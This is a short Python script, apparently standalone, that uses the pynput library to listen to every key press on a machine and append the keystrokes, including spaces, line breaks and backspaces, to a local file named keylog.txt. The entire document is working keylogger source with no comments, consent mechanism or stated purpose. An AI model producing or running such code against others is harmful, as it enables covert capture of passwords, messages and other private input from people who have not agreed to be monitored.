from pynput.keyboard import Listener

def log_keystrokes(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'
    with open("keylog.txt", 'a') as log_file:
        log_file.write(key)

with Listener(on_press=log_keystrokes) as listener:
    listener.join()
